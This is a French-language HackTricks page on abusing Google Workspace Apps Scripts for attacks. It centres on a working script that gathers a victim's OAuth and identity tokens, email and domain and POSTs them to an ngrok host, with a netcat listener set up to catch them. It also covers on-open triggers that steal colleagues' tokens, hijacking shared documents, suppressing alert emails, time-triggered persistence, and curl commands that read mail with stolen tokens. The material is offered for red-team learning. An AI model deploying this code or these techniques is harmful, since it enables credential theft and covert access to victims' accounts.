# GWS - App Scripts

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## App Scripts

App Scripts est **du code qui sera d√©clench√© lorsqu'un utilisateur avec la permission d'√©diteur acc√®de au document auquel le App Script est li√©** et apr√®s **avoir accept√© l'invite OAuth**.\
Ils peuvent √©galement √™tre configur√©s pour √™tre **ex√©cut√©s √† intervalles r√©guliers** par le propri√©taire du App Script (Persistance).

### Cr√©er App Script

Il existe plusieurs fa√ßons de cr√©er un App Script, bien que les plus courantes soient **depuis un Document Google (de n'importe quel type)** et en tant que **projet autonome** :

<details>

<summary>Cr√©er un projet li√© √† un conteneur depuis Google Docs, Sheets ou Slides</summary>

1. Ouvrez un document Docs, un tableur Sheets ou une pr√©sentation Slides.
2. Cliquez sur **Extensions** > **Google Apps Script**.
3. Dans l'√©diteur de script, cliquez sur **Projet sans titre**.
4. Donnez un nom √† votre projet et cliquez sur **Renommer**.

</details>

<details>

<summary>Cr√©er un projet autonome</summary>

Pour cr√©er un projet autonome depuis Apps Script :

1. Allez sur [`script.google.com`](https://script.google.com/).
2. Cliquez sur **Nouveau Projet**.
3. Dans l'√©diteur de script, cliquez sur **Projet sans titre**.
4. Donnez un nom √† votre projet et cliquez sur **Renommer**.

</details>

<details>

<summary>Cr√©er un projet autonome depuis Google Drive</summary>

1. Ouvrez [Google Drive](https://drive.google.com/).
2. Cliquez sur **Nouveau** > **Plus** > **Google Apps Script**.

</details>

<details>

<summary>Cr√©er un projet li√© √† un conteneur depuis Google Forms</summary>

1. Ouvrez un formulaire dans Google Forms.
2. Cliquez sur Plus more_vert > **√âditeur de script**.
3. Dans l'√©diteur de script, cliquez sur **Projet sans titre**.
4. Donnez un nom √† votre projet et cliquez sur **Renommer**.

</details>

<details>

<summary>Cr√©er un projet autonome en utilisant l'outil de ligne de commande clasp</summary>

`clasp` est un outil de ligne de commande qui vous permet de cr√©er, de tirer/pousser et de d√©ployer des projets Apps Script depuis un terminal.

Consultez le [guide de l'Interface de Ligne de Commande utilisant `clasp`](https://developers.google.com/apps-script/guides/clasp) pour plus de d√©tails.

</details>

## Sc√©nario App Script <a href="#create-using-clasp" id="create-using-clasp"></a>

### Cr√©er une feuille Google avec App Script

Commencez par cr√©er un App Script, ma recommandation pour ce sc√©nario est de cr√©er une feuille Google et d'aller dans **`Extensions > App Scripts`**, cela ouvrira **un nouveau App Script pour vous li√© √† la feuille**.

### Fuite de token

Pour donner acc√®s au token OAuth, vous devez cliquer sur **`Services +` et ajouter des scopes comme** :

* **AdminDirectory** : Acc√©der aux utilisateurs et groupes de l'annuaire (si l'utilisateur a suffisamment de permissions)
* **Gmail** : Pour acc√©der aux donn√©es Gmail
* **Drive** : Pour acc√©der aux donn√©es Drive
* **API Google Sheets** : Pour qu'il fonctionne avec le d√©clencheur

Pour changer vous-m√™me les **scopes n√©cessaires**, vous pouvez aller dans les param√®tres du projet et **activer S`how "appsscript.json" manifest file in editor`.**

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
```
Pour capturer la requ√™te, vous pouvez simplement ex√©cuter :
```
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
Permissions demand√©es pour ex√©cuter le App Script :

<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Comme une demande externe est faite, l'invite OAuth demandera √©galement **la permission d'atteindre des points de terminaison externes**.
{% endhint %}

### Cr√©er un d√©clencheur

Une fois l'application pr√™te, cliquez sur **‚è∞ D√©clencheurs** pour cr√©er un d√©clencheur. Comme **fonction** √† ex√©cuter choisissez **`getToken`**, ex√©cutez au d√©ploiement **`Head`**, dans la source de l'√©v√©nement s√©lectionnez **`Depuis le tableur`** et comme type d'√©v√©nement choisissez **`√Ä l'ouverture`** ou **`√Ä la modification`** (selon vos besoins) et sauvegardez.

Notez que vous pouvez v√©rifier **les ex√©cutions des App Scripts dans l'onglet Ex√©cutions** si vous souhaitez d√©boguer quelque chose.

### Partage

Pour **d√©clencher** le **App Script**, la victime doit se connecter avec **un acc√®s √âditeur**.

En r√©sum√©, si le cr√©ateur et l'utilisateur invit√© sont **de la m√™me organisation**, le **jeton OAuth** appartiendra √† **l'utilisateur** acc√©dant au fichier.\
S'ils sont de **diff√©rentes organisations**, le **jeton** appartiendra toujours au **cr√©ateur du d√©clencheur** avec **seulement les permissions OAuth donn√©es** lors de la cr√©ation du d√©clencheur.

{% hint style="success" %}
* Si vous g√©n√©rez simplement un **lien √âditeur √† partager avec tout le monde**, le App Script sera **ex√©cut√© avec les permissions du cr√©ateur** de celui-ci, donc vous n'obtiendrez pas le jeton d'un utilisateur qui l'ouvre.
* Si vous **invitez des personnes ext√©rieures √† votre organisation**, le **App Script est ex√©cut√© avec les permissions du cr√©ateur des d√©clencheurs** (volant le jeton du cr√©ateur et non de l'utilisateur qui a ouvert le document).
{% endhint %}

{% hint style="danger" %}
* Si vous invitez **des personnes de votre propre entreprise, elles ne seront pas interrog√©es sur les permissions OAuth** et le App Script sera ex√©cut√© avec LEURS permissions d'utilisateur, volant leurs jetons.
* Un attaquant pourrait **ajouter un App Script √† un document nouveau ou existant** que des personnes de la m√™me organisation vont ouvrir et **voler des jetons d'eux** sans qu'ils s'en rendent compte !
{% endhint %}

### Abuser des documents Partag√©s avec moi

{% hint style="danger" %}
* Si quelqu'un d'externe **a partag√© avec vous un document avec des App Scripts et un d√©clencheur utilisant le Head** du App Script (pas un d√©ploiement fixe), vous pouvez modifier le code du App Script (en ajoutant par exemple les fonctions de vol de jeton), y acc√©der, et le **App Script sera ex√©cut√© avec les permissions de l'utilisateur qui a partag√© le document avec vous** ! (notez que le jeton OAuth du propri√©taire aura comme √©tendues d'acc√®s celles donn√©es lors de la cr√©ation du d√©clencheur).
* Si c'est quelqu'un de l'interne, il sera ex√©cut√© avec vos permissions.... juste **partagez-le avec une personne externe et acc√©dez-y depuis l'email de la personne externe** pour l'ex√©cuter avec les permissions du cr√©ateur
* Une **notification sera envoy√©e au cr√©ateur du script indiquant que quelqu'un a modifi√© le script** (Que diriez-vous d'utiliser les permissions gmail pour g√©n√©rer un filtre pour emp√™cher l'alerte ?)
{% endhint %}

{% hint style="success" %}
Si un **attaquant modifie les √©tendues du App Script**, les mises √† jour **ne seront pas appliqu√©es** au document jusqu'√† ce qu'un **nouveau d√©clencheur** avec les changements soit cr√©√©. Par cons√©quent, un attaquant ne pourra pas voler le jeton du propri√©taire cr√©ateur avec plus d'√©tendues que celui qu'il a d√©fini dans le d√©clencheur qu'il a cr√©√©.
{% endhint %}

### Copier au lieu de partager

Lorsque vous cr√©ez un lien pour partager un document, un lien similaire √† celui-ci est cr√©√© : `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
Si vous **changez** la fin **"/edit"** par **"/copy"**, au lieu d'y acc√©der, Google vous demandera si vous voulez **g√©n√©rer une copie du document :**

<figure><img src="../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

Si l'utilisateur le copie et y acc√®de, le **contenu du document et les App Scripts seront copi√©s**, cependant les **d√©clencheurs ne le seront pas**, donc **rien ne sera ex√©cut√©**.

### Partager en tant qu'application Web

Notez qu'il est √©galement possible de **partager un App Script en tant qu'application Web** (dans l'√©diteur du App Script, d√©ployez en tant qu'application Web), mais une alerte comme celle-ci appara√Ætra :

<figure><img src="../../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

Suivie de **l'invite OAuth typique demandant** les permissions n√©cessaires.

### Test

Vous pouvez tester un jeton recueilli pour lister les emails avec :

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
Liste des calendriers de l'utilisateur :
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## App Script comme Persistance

Il est √©galement possible de cr√©er un App Script et de le faire d√©clencher toutes les X temps (comme chaque minute, heure, jour...). Un attaquant qui a **compromis les identifiants ou une session d'une victime pourrait configurer un d√©clencheur temporel App Script et provoquer une fuite d'un jeton OAuth tr√®s privil√©gi√© chaque jour** :

Il suffit de cr√©er un App Script, aller dans D√©clencheurs, cliquer sur Ajouter un d√©clencheur, et s√©lectionner comme source d'√©v√©nement √Ä intervalles r√©guliers et choisir les options qui vous conviennent le mieux :

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Cela cr√©era un email d'alerte de s√©curit√© et un message push sur votre mobile vous alertant √† ce sujet.
{% endhint %}



### Contournement de l'Avertissement Non V√©rifi√© pour Document Partag√©

De plus, si quelqu'un a **partag√©** avec vous un document avec un **acc√®s √©diteur**, vous pouvez g√©n√©rer des **App Scripts √† l'int√©rieur du document** et le **PROPRI√âTAIRE (cr√©ateur) du document sera le propri√©taire de l'App Script**.

{% hint style="warning" %}
Cela signifie que le **cr√©ateur du document appara√Ætra comme cr√©ateur de tout App Script** que toute personne avec un acc√®s √©diteur cr√©e √† l'int√©rieur de celui-ci.

Cela signifie √©galement que l'**App Script sera consid√©r√© comme fiable par l'environnement Workspace** du cr√©ateur du document.
{% endhint %}

{% hint style="danger" %}
Cela signifie aussi que si un **App Script existait d√©j√†** et que les gens ont **accord√© l'acc√®s**, toute personne avec une permission **√âditeur** sur le document peut **le modifier et abuser de cet acc√®s.**\
Pour abuser de cela, vous avez √©galement besoin que les gens d√©clenchent l'App Script. Et une astuce int√©ressante est de **publier le script en tant qu'application web**. Lorsque les **personnes** qui ont d√©j√† accord√© **l'acc√®s** √† l'App Script acc√®dent √† la page web, elles vont **d√©clencher l'App Script** (cela fonctionne aussi en utilisant des balises `<img>`).
{% endhint %}

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
